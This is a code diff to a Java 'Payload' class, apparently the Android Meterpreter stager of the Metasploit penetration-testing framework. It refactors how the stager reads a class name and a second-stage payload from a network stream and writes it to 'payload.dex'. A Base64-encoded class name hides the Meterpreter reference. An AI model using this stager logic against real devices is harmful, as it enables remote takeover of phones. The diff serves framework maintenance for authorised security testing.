@@ -154,6 +154,19 @@ public class Payload {
         }
     }
 
+    private static byte[] loadBytes(DataInputStream in) throws Exception {
+        int byteLen = in.readInt();
+        byte[] bytes = new byte[byteLen];
+        int n = 0;
+        while (n < byteLen) {
+            int count = in.read(bytes, n, byteLen - n);
+            if (count < 0)
+                throw new Exception();
+            n += count;
+        }
+        return bytes;
+    }
+
     private static void runNextStage(DataInputStream in, OutputStream out, Object[] parameters) throws Exception {
         try {
             byte[] androidMeterpreter = Base64.decode("Y29tLm1ldGFzcGxvaXQubWV0ZXJwcmV0ZXIuQW5kcm9pZE1ldGVycHJldGVy", 0);
@@ -168,22 +181,16 @@ public class Payload {
             String dexPath = path + File.separatorChar + "payload.dex";
 
             // Read the class name
-            int coreLen = in.readInt();
-            byte[] core = new byte[coreLen];
-            in.readFully(core);
-            String classFile = new String(core);
+            String classFile = new String(loadBytes(in));
 
             // Read the stage
-            coreLen = in.readInt();
-            core = new byte[coreLen];
-            in.readFully(core);
-
+            byte[] stageBytes = loadBytes(in);
             File file = new File(filePath);
             if (!file.exists()) {
                 file.createNewFile();
             }
             FileOutputStream fop = new FileOutputStream(file);
-            fop.write(core);
+            fop.write(stageBytes);
             fop.flush();
             fop.close();
 
